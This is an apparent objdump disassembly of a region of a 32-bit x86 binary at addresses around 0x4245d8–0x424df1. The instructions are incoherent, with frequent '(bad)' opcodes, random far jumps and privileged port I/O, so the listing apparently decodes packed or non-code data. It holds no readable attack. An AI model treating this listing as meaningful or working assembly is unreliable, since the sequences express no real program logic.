  4245d8:	repnz lds ecx,FWORD PTR [edx-0x49]
  4245dc:	pop    ebx
  4245dd:	mov    eax,ds:0xbf4a8820
  4245e2:	push   edi
  4245e3:	jp     0x42458c
  4245e5:	add    edx,DWORD PTR [edx+0x2b]
  4245e8:	rcr    DWORD PTR [edi-0x108e00bd],0xd2
  4245ef:	sbb    eax,0x5449596b
  4245f4:	push   ebp
  4245f5:	dec    ecx
  4245f6:	push   edx
  4245f7:	and    cl,BYTE PTR [edx-0x41b53dfe]
  4245fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245fe:	fdivr  st,st(6)
  424600:	cwde   
  424601:	sahf   
  424602:	fs xchg edi,eax
  424604:	pusha  
  424605:	xchg   DWORD PTR [ecx+0x10e6501d],eax
  42460b:	rcl    ecx,cl
  42460d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42460e:	addr16 push es
  424610:	cmp    esp,esi
  424612:	add    DWORD PTR [edx],0x377cc929
  424618:	daa    
  424619:	mov    al,0x5c
  42461b:	shr    BYTE PTR [edi],0x70
  42461e:	mov    ah,0x51
  424620:	mov    al,0x36
  424622:	dec    eax
  424623:	jg     0x424625
	...
  424631:	imul   ecx,DWORD PTR [edi+0x7dee7c8a],0xffffffff
  424638:	lahf   
  424639:	push   esi
  42463a:	jl     0x4245fd
  42463c:	dec    edi
  42463d:	int3   
  42463e:	fisttp WORD PTR [ebx+ecx*2]
  424641:	leave  
  424642:	mov    ebp,0x3ab0001
  424647:	add    BYTE PTR [eax],al
  424649:	mov    ds:0x6888411e,eax
  42464e:	test   BYTE PTR [esp+edx*4-0x583684d1],ah
  424655:	mov    eax,ds:0xbf2fd63b
  42465a:	das    
  42465b:	test   DWORD PTR ss:[edx],0x5edaf7ea
  424662:	xlat   BYTE PTR ds:[ebx]
  424663:	and    eax,0xcecc9713
  424668:	jo     0x4246e2
  42466a:	jb     0x4246bb
  42466c:	push   ebx
  42466d:	mov    ds:0x12848dfb,al
  424672:	add    eax,0x49644741
  424677:	sbb    al,0x8b
  424679:	xchg   esi,eax
  42467a:	sbb    esi,esp
  42467c:	push   ss
  42467d:	jl     0x424637
  42467f:	dec    eax
  424680:	(bad)  
  424681:	xchg   edx,eax
  424682:	jno    0x42460e
  424684:	nop
  424685:	xchg   esi,eax
  424686:	pop    ds
  424687:	mov    ch,0x88
  424689:	or     bh,bh
  42468b:	add    al,0x72
  42468d:	dec    edi
  42468e:	jecxz  0x4246b6
  424690:	clc    
  424691:	pop    ebp
  424692:	mov    ds:0x94573a1e,al
  424697:	inc    edx
  424698:	mov    cl,0x7b
  42469a:	xor    dl,BYTE PTR [esi]
  42469c:	pop    edx
  42469d:	aas    
  42469e:	dec    edi
  42469f:	daa    
  4246a0:	add    esi,esp
  4246a2:	nop
  4246a3:	lahf   
  4246a4:	pop    es
  4246a5:	lods   al,BYTE PTR ds:[esi]
  4246a6:	cmp    al,0xc
  4246a8:	loopne 0x42463a
  4246aa:	xchg   edx,eax
  4246ab:	loop   0x42463b
  4246ad:	xchg   edi,eax
  4246ae:	or     al,0xb1
  4246b0:	mov    esp,0xb3cc79b1
  4246b5:	pop    esi
  4246b6:	lods   al,BYTE PTR es:[esi]
  4246b8:	or     ch,cl
  4246ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246bb:	adc    BYTE PTR [ebx-0x11],dh
  4246be:	mov    esp,0x93be0327
  4246c3:	cmp    BYTE PTR [eax-0x11a248ef],ah
  4246c9:	in     al,dx
  4246ca:	inc    esp
  4246cb:	and    al,0xbb
  4246cd:	mov    bl,0x7c
  4246cf:	sub    dh,BYTE PTR [eax+0x11eb889f]
  4246d5:	mov    edx,0x986923ea
  4246da:	ss and al,0x16
  4246dd:	and    DWORD PTR [esi],ebp
  4246df:	mov    al,ds:0xf161a028
  4246e4:	add    eax,0x2e9a5715
  4246e9:	test   BYTE PTR [edx-0x50e2088],cl
  4246ef:	(bad)
  4246f2:	add    BYTE PTR [ebp-0x33],dh
  4246f5:	xchg   ebx,eax
  4246f6:	jnp    0x4246dc
  4246f8:	jo     0x4246ed
  4246fa:	push   edi
  4246fb:	bound  esi,QWORD PTR [ebp-0x4e4b051c]
  424701:	pop    ss
  424702:	xchg   DWORD PTR [ebx+0x1329c320],ecx
  424708:	jae    0x4246a4
  42470a:	repnz in eax,0x97
  42470d:	adc    al,0x59
  42470f:	retf   0x775
  424712:	es pushf 
  424714:	out    0x68,al
  424716:	test   al,0x11
  424718:	sahf   
  424719:	push   0xd7173318
  42471e:	daa    
  42471f:	rcl    BYTE PTR [edx+0x2bd02e87],cl
  424725:	pop    edx
  424726:	pop    edi
  424727:	adc    al,0xc0
  424729:	scas   eax,DWORD PTR es:[edi]
  42472a:	xchg   ecx,eax
  42472b:	jle    0x424724
  42472d:	add    bh,BYTE PTR [eax-0x1854795]
  424733:	test   eax,0xb4a01307
  424738:	fld    DWORD PTR ds:0x32c2353b
  42473e:	mov    dh,0x59
  424740:	loope  0x4247bf
  424742:	mov    DWORD PTR [ecx],esi
  424744:	fistp  DWORD PTR [edx]
  424746:	xchg   ebx,eax
  424747:	mov    dl,0x5a
  424749:	and    ecx,DWORD PTR ds:0xa97f9107
  42474f:	mov    BYTE PTR [ebx+0x17e679b9],bl
  424755:	popf   
  424756:	ror    DWORD PTR ds:0xeb0e126,1
  42475c:	frstor [edx+0x1e]
  42475f:	bound  edi,QWORD PTR [edi+0x705a4876]
  424765:	or     BYTE PTR [esi],0x43
  424768:	mov    ds:0x6bad7a54,al
  42476d:	cmp    ah,BYTE PTR [ecx-0x3b7bc925]
  424773:	lods   eax,DWORD PTR ds:[esi]
  424774:	mov    cl,0x38
  424776:	xor    al,0x95
  424778:	xor    cl,BYTE PTR [ecx+0xf]
  42477b:	dec    esp
  42477c:	pop    ebp
  42477d:	outs   dx,BYTE PTR ds:[esi]
  42477e:	mov    ebx,0x4a3f0b1
  424783:	cli    
  424784:	dec    edi
  424785:	and    DWORD PTR [esi],0x6f7768bf
  42478b:	xor    ah,bl
  42478d:	hlt    
  42478e:	adc    eax,0xdee70c95
  424793:	(bad)  
  424794:	jmp    0x2c68:0x98fa5de0
  42479b:	jbe    0x42480b
  42479d:	iret   
  42479e:	ds push cs
  4247a0:	neg    BYTE PTR [edx]
  4247a2:	dec    eax
  4247a3:	xor    DWORD PTR [edx-0x1a6bd467],eax
  4247a9:	shr    DWORD PTR [esi+0x3],0x49
  4247ad:	call   0xeed2:0x3f7a3f8d
  4247b4:	(bad)  
  4247b5:	clc    
  4247b6:	shr    DWORD PTR [edi],cl
  4247b8:	lahf   
  4247b9:	sbb    BYTE PTR [esp+ecx*2],bh
  4247bc:	scas   al,BYTE PTR es:[edi]
  4247bd:	xchg   ebp,eax
  4247be:	mov    cl,0x5d
  4247c0:	push   ds
  4247c1:	pop    esi
  4247c2:	sbb    BYTE PTR [edi],dl
  4247c4:	cdq    
  4247c5:	(bad)  
  4247c6:	addr16 (bad) 
  4247c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247c9:	aad    0xeb
  4247cb:	jbe    0x4247d2
  4247cd:	or     eax,0x4e8cf15b
  4247d2:	shr    BYTE PTR [esi-0x61d8d61e],1
  4247d8:	pop    esp
  4247d9:	push   esp
  4247da:	clc    
  4247db:	adc    BYTE PTR [edi],0x62
  4247de:	and    al,0x85
  4247e0:	aas    
  4247e1:	lea    ebp,[edx+0x4c]
  4247e4:	sbb    al,0x9
  4247e6:	mov    dh,0xce
  4247e8:	inc    esi
  4247e9:	cdq    
  4247ea:	pop    es
  4247eb:	jmp    0xddeb:0x89a28c2c
  4247f2:	or     cl,BYTE PTR [esi-0x60aed4af]
  4247f8:	jbe    0x424830
  4247fa:	fwait
  4247fb:	push   eax
  4247fc:	sub    DWORD PTR [edx+0x74ca9dd],ebp
  424802:	push   cs
  424803:	stc    
  424804:	jno    0x424879
  424806:	mov    es,WORD PTR [ecx]
  424808:	jle    0x4247a2
  42480a:	xor    DWORD PTR [ebx+0x62],0x393675bf
  424811:	fnsavew [eax]
  424814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424815:	cmp    BYTE PTR [ebx+ecx*4+0x5e],cl
  424819:	mov    edi,0x1bb76314
  42481e:	icebp  
  42481f:	icebp  
  424820:	sbb    BYTE PTR ds:0x49aba01c,dl
  424826:	sub    al,0x11
  424828:	and    DWORD PTR [ebp+edi*8+0x4f7e8b77],esp
  42482f:	mov    edx,0xcd344fc
  424834:	pop    ss
  424835:	mov    fs,WORD PTR [edx+edi*2-0x379ec201]
  42483c:	mov    cl,BYTE PTR [edx]
  42483e:	jns    0x4247fc
  424840:	repnz cmp BYTE PTR [edi],bh
  424843:	mov    ch,0xdf
  424845:	adc    BYTE PTR [ecx+0x24],ah
  424848:	xor    DWORD PTR [ebx+0x1a8597c8],0x6b7aa4ce
  424852:	mov    BYTE PTR [eax+0x5ec2a1dc],cl
  424858:	jb     0x4248c6
  42485a:	xchg   esi,eax
  42485b:	pop    eax
  42485c:	call   0x383ee807
  424861:	xor    BYTE PTR [ebx+eax*2],cl
  424864:	fist   DWORD PTR ds:0x59a856ce
  42486a:	sub    DWORD PTR [edx+0x3],0x490fb9c0
  424871:	(bad)  
  424872:	out    0xb3,eax
  424874:	xchg   ecx,eax
  424875:	fs push es
  424877:	pop    ebx
  424878:	mov    ebx,0x1fffd507
  42487d:	sub    al,0x78
  42487f:	or     ch,BYTE PTR [eax]
  424881:	fucomi st,st(4)
  424883:	shl    bh,cl
  424885:	das    
  424886:	ret    0xf1d1
  424889:	dec    eax
  42488a:	jg     0x424830
  42488c:	jle    0x42486a
  42488e:	lock push ebx
  424890:	push   ebx
  424891:	outs   dx,DWORD PTR ds:[esi]
  424892:	or     ebx,DWORD PTR [edx]
  424894:	popf   
  424895:	fimul  DWORD PTR [edx+0x17104756]
  42489b:	in     eax,dx
  42489c:	push   edi
  42489d:	mov    ebp,0x21bd86f8
  4248a2:	pop    edi
  4248a4:	xchg   edx,eax
  4248a5:	out    dx,eax
  4248a6:	in     eax,dx
  4248a7:	and    ch,bh
  4248a9:	xchg   DWORD PTR [ebp+edx*4+0x493ac39d],esi
  4248b0:	aas    
  4248b1:	pop    es
  4248b2:	cmp    DWORD PTR [eax],edi
  4248b4:	ror    BYTE PTR [ecx],1
  4248b6:	pop    ebp
  4248b7:	stos   BYTE PTR es:[edi],al
  4248b8:	mov    al,ds:0x5d8134a3
  4248bd:	rol    DWORD PTR [esi],0x1b
  4248c0:	jmp    0xda08:0x718fe284
  4248c7:	jo     0x4248a7
  4248c9:	sti    
  4248ca:	fnstcw WORD PTR [edx-0x72]
  4248cd:	mov    edi,0xc03c1493
  4248d2:	scas   al,BYTE PTR es:[edi]
  4248d3:	aam    0x41
  4248d5:	xchg   bl,ch
  4248d7:	(bad)  
  4248d8:	sahf   
  4248d9:	xchg   DWORD PTR [edx+edx*2],esp
  4248dc:	pop    edi
  4248dd:	outs   dx,DWORD PTR ds:[esi]
  4248de:	repnz sar DWORD PTR [eax-0x1f1dbb89],1
  4248e5:	pop    ebp
  4248e6:	jnp    0x424933
  4248e8:	fsub   st(2),st
  4248ea:	cmp    ah,0x27
  4248ed:	inc    edx
  4248ee:	mov    eax,esi
  4248f0:	mov    edi,0x93063d6e
  4248f5:	mov    esp,0xd5fdf276
  4248fa:	sub    DWORD PTR [ebp+ebx*2+0x48],ecx
  4248fe:	retf   
  4248ff:	jne    0x4248eb
  424901:	sub    bl,bl
  424903:	pop    edi
  424904:	fld1   
  424906:	pop    eax
  424907:	out    0x1d,al
  424909:	and    ebx,esp
  42490b:	rol    DWORD PTR [ecx],0x37
  42490e:	push   0xf1813447
  424913:	mov    edx,0x1ed44340
  424918:	inc    edi
  424919:	mov    cl,0x29
  42491b:	mov    eax,0x5abf0593
  424920:	out    dx,al
  424921:	mov    DWORD PTR [esp+edx*2],esi
  424924:	scas   al,BYTE PTR es:[edi]
  424925:	outs   dx,DWORD PTR ds:[esi]
  424926:	stos   BYTE PTR es:[edi],al
  424927:	in     eax,dx
  424928:	(bad)  
  424929:	popa   
  42492a:	push   0x52a5802b
  42492f:	in     al,dx
  424930:	adc    edi,esi
  424932:	das    
  424933:	jmp    0x424947
  424935:	dec    ecx
  424936:	inc    edi
  424937:	or     BYTE PTR [edi-0x9814d01],cl
  42493d:	push   cs
  42493e:	shl    DWORD PTR [edi-0x64e9a92b],1
  424944:	aaa    
  424945:	xchg   esi,eax
  424946:	call   0x3172:0x7efa5fe
  42494d:	outs   dx,DWORD PTR ds:[esi]
  42494e:	lea    edx,[ecx-0x795e2dd5]
  424954:	test   DWORD PTR [eax+0xd99dd1b],edi
  42495a:	movntps XMMWORD PTR [ecx+edi*4],xmm6
  42495e:	shl    BYTE PTR [esi],cl
  424960:	sub    ch,0xd2
  424963:	mov    BYTE PTR [ebp+0x33],0x0
  424967:	lds    esp,FWORD PTR [eax-0x342e27d5]
  42496d:	sbb    eax,0x4291789a
  424972:	es pop ecx
  424974:	stos   BYTE PTR es:[edi],al
  424975:	test   BYTE PTR [esi+0x1],cl
  424978:	test   bh,bl
  42497a:	in     al,0x82
  42497c:	fdecstp 
  42497e:	(bad)  [edi+0x5f]
  424981:	sub    BYTE PTR [ecx-0x47],0x53
  424985:	lods   eax,DWORD PTR ds:[esi]
  424986:	(bad)  
  424987:	(bad)  
  424988:	addr16 xor eax,0x138d1cc1
  42498e:	mov    dh,0x1b
  424990:	rol    DWORD PTR [edx+0x5d6bce58],cl
  424996:	push   es
  424997:	das    
  424998:	or     eax,0x630a58f4
  42499d:	pop    edi
  42499e:	mov    bh,0x84
  4249a0:	and    eax,0x2cc5bbbf
  4249a5:	out    dx,al
  4249a6:	add    al,0x5e
  4249a8:	xchg   esp,eax
  4249a9:	test   eax,0xfc575fd
  4249ae:	addr16 loop 0x424943
  4249b1:	out    dx,eax
  4249b2:	jbe    0x424a2c
  4249b4:	pop    ecx
  4249b5:	mov    dl,0x6d
  4249b7:	scas   eax,DWORD PTR es:[edi]
  4249b8:	fisttp QWORD PTR [esi]
  4249ba:	(bad)  
  4249bb:	ss add ecx,edi
  4249be:	addr16 out 0xc3,al
  4249c1:	pop    ebx
  4249c2:	xchg   esi,ebp
  4249c4:	repnz enter 0xd608,0x4b
  4249c9:	popf   
  4249ca:	dec    edx
  4249cb:	pop    esi
  4249cc:	mov    fs,WORD PTR [ebx]
  4249ce:	shr    DWORD PTR [esi+0x17],1
  4249d1:	pop    esp
  4249d2:	sub    ecx,0x13b0ecb9
  4249d8:	mov    cl,0xd5
  4249da:	fisttp DWORD PTR [edx]
  4249dc:	cdq    
  4249dd:	add    al,0x5d
  4249df:	and    al,0x9e
  4249e1:	sub    ecx,DWORD PTR [ebx+ecx*2-0x39894ce4]
  4249e8:	adc    BYTE PTR [eax-0x57],bl
  4249eb:	or     ebp,esp
  4249ed:	mov    ebx,0x2c80ca1e
  4249f2:	jecxz  0x424a56
	...
  424a00:	add    BYTE PTR [ebp+0x6a],dl
  424a03:	out    0xb3,al
  424a05:	(bad)  
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	or     BYTE PTR [ecx],ch
  424a0f:	add    al,0x8c
  424a11:	je     0x4249d4
  424a13:	add    DWORD PTR [eax],eax
  424a15:	stos   DWORD PTR es:[edi],eax
  424a16:	add    eax,DWORD PTR [eax]
  424a18:	add    BYTE PTR [eax+0x61b32142],bl
  424a1e:	es dec edi
  424a20:	sar    bl,0x46
  424a23:	xor    ecx,DWORD PTR [ecx]
  424a25:	and    eax,0xb01a50c8
  424a2a:	add    ah,BYTE PTR [ebx+ebp*4-0x70153aa2]
  424a31:	sbb    cl,dl
  424a33:	cmp    BYTE PTR [ecx],ah
  424a35:	jl     0x424ab4
  424a37:	sbb    al,0x98
  424a39:	add    eax,0x971afc33
  424a3e:	inc    eax
  424a3f:	jmp    0xc76cb8c4
  424a44:	mov    bl,0xfa
  424a46:	(bad)  
  424a47:	into   
  424a48:	cmp    eax,0xfde641ad
  424a4d:	fidivr WORD PTR [ebp+0x479b5d86]
  424a53:	add    DWORD PTR fs:[ebx],esp
  424a56:	sbb    BYTE PTR cs:[ecx+ebx*1],al
  424a5a:	inc    ecx
  424a5b:	lds    eax,FWORD PTR [edx+0x75ecbdf1]
  424a61:	lods   al,BYTE PTR ds:[esi]
  424a62:	push   ebx
  424a63:	xor    dh,BYTE PTR ds:0xeeb81089
  424a69:	(bad)  
  424a6a:	sahf   
  424a6b:	scas   al,BYTE PTR es:[edi]
  424a6c:	inc    di
  424a6e:	cmp    edi,edx
  424a70:	push   ss
  424a71:	inc    edx
  424a72:	mov    al,ds:0x5da55f1a
  424a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a78:	arpl   ax,si
  424a7a:	xor    al,0x52
  424a7c:	push   ebx
  424a7d:	jle    0x424aa7
  424a7f:	pop    esp
  424a80:	scas   eax,DWORD PTR es:[edi]
  424a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a82:	push   0x76209b2b
  424a87:	ins    BYTE PTR es:[edi],dx
  424a88:	cmp    bl,cl
  424a8a:	out    dx,al
  424a8b:	adc    eax,0xae466f54
  424a90:	xor    edx,DWORD PTR [ebx-0x4e]
  424a93:	out    dx,al
  424a94:	push   ss
  424a95:	mov    ch,0xb
  424a97:	gs sub bl,cl
  424a9a:	scas   al,BYTE PTR es:[edi]
  424a9b:	popf   
  424a9c:	scas   al,BYTE PTR es:[edi]
  424a9d:	mov    dh,0x43
  424a9f:	in     al,0xeb
  424aa1:	inc    esi
  424aa2:	add    al,0x4e
  424aa4:	dec    ebx
  424aa5:	(bad)  
  424aa6:	pop    esi
  424aa7:	mov    al,ds:0xa16f998f
  424aac:	pop    ebp
  424aad:	test   eax,0x4da81359
  424ab2:	jo     0x424a9c
  424ab4:	adc    al,0xfe
  424ab6:	and    ebx,ecx
  424ab8:	jmp    DWORD PTR [ebx+0x14f87b3e]
  424abe:	cwde   
  424abf:	jle    0x424a73
  424ac1:	or     eax,0xa9c0ba4a
  424ac6:	mov    al,ds:0xceb3f13e
  424acb:	inc    ecx
  424acc:	mov    ds:0x385dd2f4,eax
  424ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ad2:	pop    DWORD PTR [eax-0x14295c8a]
  424ad8:	mov    al,ds:0xaba696c3
  424add:	mov    ebp,0x631d9c5a
  424ae2:	push   eax
  424ae3:	jmp    0x424b24
  424ae5:	lods   eax,DWORD PTR ds:[esi]
  424ae6:	fwait
  424ae7:	(bad)  
  424ae8:	sar    DWORD PTR [edi+0x45],cl
  424aeb:	sbb    DWORD PTR [edi+0x10],esp
  424aee:	arpl   bp,bp
  424af0:	leave  
  424af1:	lods   eax,DWORD PTR ds:[esi]
  424af2:	std    
  424af3:	ss loope 0x424b0d
  424af6:	cld    
  424af7:	or     BYTE PTR [edi],bl
  424af9:	add    ebp,DWORD PTR [eax-0x33]
  424afc:	inc    ebp
  424afd:	pop    ecx
  424afe:	aad    0x41
  424b00:	(bad)  
  424b01:	pop    ebx
  424b02:	dec    edi
  424b03:	push   edx
  424b04:	(bad)  
  424b05:	mov    ah,0xa5
  424b07:	int    0xb
  424b09:	pop    edx
  424b0a:	pop    esi
  424b0b:	cmp    BYTE PTR [ebx-0x37ca3f7a],ch
  424b11:	out    0xf0,al
  424b13:	ins    DWORD PTR es:[edi],dx
  424b14:	mov    edi,0x784bca83
  424b19:	adc    edx,DWORD PTR [ebx-0x4b1831fc]
  424b1f:	rcl    BYTE PTR [edi-0x38f475f7],1
  424b25:	repz add al,0x8d
  424b28:	aad    0x89
  424b2a:	dec    ebp
  424b2b:	repz dec ecx
  424b2d:	adc    eax,DWORD PTR [ecx+0x73]
  424b30:	test   al,0x98
  424b32:	iret   
  424b33:	jmp    0x359a:0x336b2b3f
  424b3a:	shl    BYTE PTR [ebp+0x6],0xe
  424b3e:	retf   0xf146
  424b41:	iret   
  424b42:	dec    esi
  424b43:	mov    bl,0xf4
  424b45:	mov    ah,0x8c
  424b47:	and    al,0x39
  424b49:	ficomp DWORD PTR [ebx]
  424b4b:	add    al,BYTE PTR [ecx+0x69]
  424b4e:	add    ch,cl
  424b50:	aam    0xc2
  424b52:	pop    ebp
  424b53:	sub    BYTE PTR [eax],dl
  424b55:	and    al,0x9a
  424b57:	mov    DWORD PTR [edx-0x35],edi
  424b5a:	mov    BYTE PTR [edx-0x28cade50],0x35
  424b61:	push   ds
  424b62:	das    
  424b63:	xchg   edi,eax
  424b64:	mov    ch,0xcd
  424b66:	add    eax,esp
  424b68:	mov    ds:0xe7d10daa,eax
  424b6d:	sub    ch,BYTE PTR ds:[edi+0x7c]
  424b71:	dec    eax
  424b72:	mov    esi,0xda1817ef
  424b77:	add    BYTE PTR [ecx-0x55],cl
  424b7a:	aam    0xbc
  424b7c:	jbe    0x424b5f
  424b7e:	je     0x424b0a
  424b80:	dec    edx
  424b81:	pop    ds
  424b82:	int3   
  424b83:	shr    DWORD PTR [edx],0x87
  424b86:	mov    eax,ds:0xbf16845c
  424b8b:	loope  0x424b2e
  424b8d:	test   ebx,ebp
  424b8f:	test   DWORD PTR [eax],ebx
  424b91:	outs   dx,BYTE PTR ds:[esi]
  424b92:	xchg   edi,eax
  424b93:	sub    DWORD PTR [esi+0x207cf9d9],ebp
  424b99:	jg     0x424b20
  424b9b:	adc    eax,0x1a496513
  424ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ba2:	mov    bl,0x12
  424ba4:	leave  
  424ba5:	jae    0x424b2f
  424ba7:	xor    dl,0xae
  424baa:	sbb    DWORD PTR [edi+0x63],0xffffffd8
  424bae:	enter  0x6bec,0xf
  424bb2:	jecxz  0x424b88
  424bb4:	fcomp  QWORD PTR [ecx-0x1ae7cc17]
  424bba:	and    DWORD PTR [ebx-0x19c284c3],ecx
  424bc0:	push   0x1bc22014
  424bc5:	push   ss
  424bc6:	jbe    0x424b71
  424bc8:	mov    edi,0x4045bbda
  424bcd:	pop    esp
  424bce:	leave  
  424bcf:	sbb    al,0x78
  424bd1:	fs cmp ebp,ebp
  424bd4:	cwde   
  424bd5:	inc    ebp
  424bd6:	rcl    BYTE PTR [edx+0x28],1
  424bd9:	test   ch,cl
  424bdb:	inc    ebp
  424bdc:	push   esp
  424bdd:	jne    0x424c2c
  424bdf:	mov    al,ds:0x79b0477d
  424be4:	fimul  WORD PTR [eax+ebp*2+0x12477154]
  424beb:	mov    edx,0x4059619a
  424bf0:	mov    DWORD PTR [esi+0x5c388312],ebp
  424bf6:	inc    edi
  424bf7:	stc    
  424bf8:	(bad)
  424bfc:	popf   
  424bfd:	lods   eax,DWORD PTR ds:[esi]
  424bfe:	jecxz  0x424ba7
  424c00:	mov    dl,0x39
  424c02:	sbb    ebx,DWORD PTR [ecx-0x7dec092c]
  424c08:	xor    ah,BYTE PTR ds:0x782d03b2
  424c0e:	cmp    dh,dh
  424c10:	jmp    0x424c34
  424c12:	xor    dl,bl
  424c14:	ss inc edx
  424c16:	aas    
  424c17:	cmp    bl,al
  424c19:	jmp    0x5ef6e032
  424c1e:	push   es
  424c1f:	mov    WORD PTR [eax],es
  424c21:	aaa    
  424c22:	or     DWORD PTR fs:[bx+0x151e],eax
  424c28:	cwde   
  424c29:	cdq    
  424c2a:	xchg   DWORD PTR [ecx+eiz*2-0x5e99bda],eax
  424c31:	mov    fs,esi
  424c33:	loopne 0x424c87
  424c35:	ja     0x424c45
  424c37:	jmp    0x11fe:0x6e7d7b84
  424c3e:	jmp    0x9341:0x2c381c7a
  424c45:	pop    ecx
  424c46:	(bad)  
  424c47:	fistp  WORD PTR [ebx+ebp*2+0x5d43b7ca]
  424c4e:	ins    DWORD PTR es:[edi],dx
  424c4f:	pop    ecx
  424c50:	and    DWORD PTR [ecx],ecx
  424c52:	inc    ecx
  424c53:	push   es
  424c54:	leave  
  424c55:	rcr    DWORD PTR [ecx+0x2b61ba51],cl
  424c5b:	mov    ebx,0xf35a6b64
  424c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c61:	test   DWORD PTR [ebp-0x14115bf8],ebp
  424c67:	adc    ecx,esi
  424c69:	pop    es
  424c6a:	ja     0x424cb9
  424c6c:	(bad)
  424c70:	cmp    al,0x98
  424c72:	sub    eax,0x3470d977
  424c77:	jnp    0x424c34
  424c79:	xor    edi,ebp
  424c7b:	jecxz  0x424cb9
  424c7d:	xor    al,0x47
  424c7f:	jbe    0x424c6b
  424c81:	dec    esp
  424c82:	and    cl,cl
  424c84:	pop    ebp
  424c85:	xor    BYTE PTR [ebp-0x729a1d80],bh
  424c8b:	cs int3 
  424c8d:	shl    BYTE PTR [esi+0x4],cl
  424c90:	pop    esi
  424c91:	fld    DWORD PTR [esi-0x78]
  424c94:	ror    BYTE PTR [edi],0x1f
  424c97:	cmp    eax,0xac9b97ac
  424c9c:	add    DWORD PTR [ecx-0x6373a732],0x2f
  424ca3:	ret    
  424ca4:	cmc    
  424ca5:	cmp    cl,BYTE PTR [ebx-0x61b394e9]
  424cab:	out    0x3b,al
  424cad:	pop    edi
  424cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424caf:	mov    esi,0xe9c54447
  424cb4:	call   0xb094d27c
  424cb9:	jns    0x424c42
  424cbb:	hlt    
  424cbc:	scas   al,BYTE PTR es:[edi]
  424cbd:	lds    esp,FWORD PTR [edx]
  424cbf:	retf   0xbba7
  424cc2:	sbb    BYTE PTR [esi-0x29411ed0],dl
  424cc8:	ja     0x424c9e
  424cca:	xor    eax,0xe1e6dd9b
  424ccf:	rol    DWORD PTR [edi-0x42],cl
  424cd2:	pop    edx
  424cd3:	daa    
  424cd4:	cs ret 0xfb9a
  424cd8:	les    esp,FWORD PTR [ebp*2+0x3b4069ec]
  424cdf:	mov    eax,ds:0xba4a27a0
  424ce4:	je     0x424d03
  424ce6:	(bad)  [eax+ebp*8-0x47]
  424cea:	jge    0x424cf7
  424cec:	data16 sub BYTE PTR [esi+eax*4],bh
  424cf0:	jg     0x424c77
  424cf2:	xor    eax,0x4d7dd00a
  424cf7:	out    0x42,eax
  424cf9:	nop
  424cfa:	shl    DWORD PTR [eax+0x4f],0x19
  424cfe:	sbb    esi,ecx
  424d00:	mov    ds:0x84c18ecf,eax
  424d05:	inc    ebp
  424d06:	out    dx,al
  424d07:	cld    
  424d08:	in     al,0x37
  424d0a:	or     al,0xaa
  424d0c:	sub    ah,BYTE PTR [edi+esi*8]
  424d0f:	mov    DWORD PTR [edx+0xbf6185f],edi
  424d15:	outs   dx,BYTE PTR ds:[esi]
  424d16:	sbb    BYTE PTR [edx],0x98
  424d19:	sbb    eax,ebp
  424d1b:	sbb    al,0x9
  424d1d:	imul   ah
  424d1f:	(bad)  
  424d20:	out    0xa4,eax
  424d22:	iret   
  424d23:	push   es
  424d24:	dec    BYTE PTR [ebx+0x44]
  424d27:	adc    eax,0xb14d1ebc
  424d2c:	push   edi
  424d2d:	imul   edi,DWORD PTR [eax],0xffffffcd
  424d30:	or     al,BYTE PTR [eax+esi*2+0x2241c9e2]
  424d37:	fdiv   QWORD PTR [esi-0x47d674b3]
  424d3d:	lea    ecx,[eax-0x3a]
  424d40:	shr    DWORD PTR [esi],1
  424d42:	popa   
  424d43:	inc    esp
  424d44:	push   0x1f
  424d46:	shl    al,0x68
  424d49:	add    DWORD PTR [edi+0x4e],ebx
  424d4c:	js     0x424dae
  424d4e:	sbb    dh,BYTE PTR [ebp-0x7511b8e]
  424d54:	fcmovnu st,st(5)
  424d56:	stc    
  424d57:	outs   dx,BYTE PTR ds:[esi]
  424d58:	stos   BYTE PTR es:[edi],al
  424d59:	lock xor al,0xe3
  424d5c:	int3   
  424d5d:	mov    ebx,0xe486706b
  424d62:	dec    esp
  424d63:	and    bh,BYTE PTR [edi]
  424d65:	pop    esi
  424d66:	shl    BYTE PTR [edi-0x6e],cl
  424d69:	add    eax,0x9482e8f9
  424d6e:	push   esp
  424d6f:	ja     0x424d76
  424d71:	pop    ss
  424d72:	bound  ecx,QWORD PTR [edx-0x54]
  424d75:	pop    es
  424d76:	ror    DWORD PTR [ecx-0x3d092199],cl
  424d7c:	xor    BYTE PTR [esi+0x5a0754c],0x3e
  424d83:	adc    bl,BYTE PTR [ebp+0x3a]
  424d86:	in     eax,0xc3
  424d88:	sub    ecx,eax
  424d8a:	mov    eax,0xa6598ffe
  424d8f:	js     0x424d4b
  424d91:	(bad)  
  424d92:	mov    eax,0xdad54873
  424d97:	ss sub al,0x37
  424d9a:	repnz mov edi,0xa043dec8
  424da0:	popa   
  424da1:	and    al,0xef
  424da3:	pop    edx
  424da4:	das    
  424da5:	addr16 inc edi
  424da7:	call   0xa2b01cb2
  424dac:	sbb    DWORD PTR [eax+0x1b60e74],ebx
  424db2:	and    edi,DWORD PTR [ebp-0x1b1577b5]
  424db8:	pop    ecx
  424db9:	fisubr DWORD PTR ds:0xc6ad163b
  424dbf:	push   esp
  424dc0:	je     0x424d86
  424dc2:	cmp    bl,bl
	...
  424dd0:	add    BYTE PTR [esi-0x42494e3],cl
  424dd6:	(bad)  
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    al,BYTE PTR [edx+0x77]
  424ddf:	mov    DWORD PTR [edi+0x1f],ecx
  424de2:	lds    eax,FWORD PTR [ecx]
  424de4:	add    BYTE PTR [ebx-0x12fffffd],ch
  424dea:	push   edx
  424deb:	into   
  424dec:	xor    al,0x8
  424dee:	jo     0x424e4c
  424df0:	iret   
  424df1:	dec    ebx
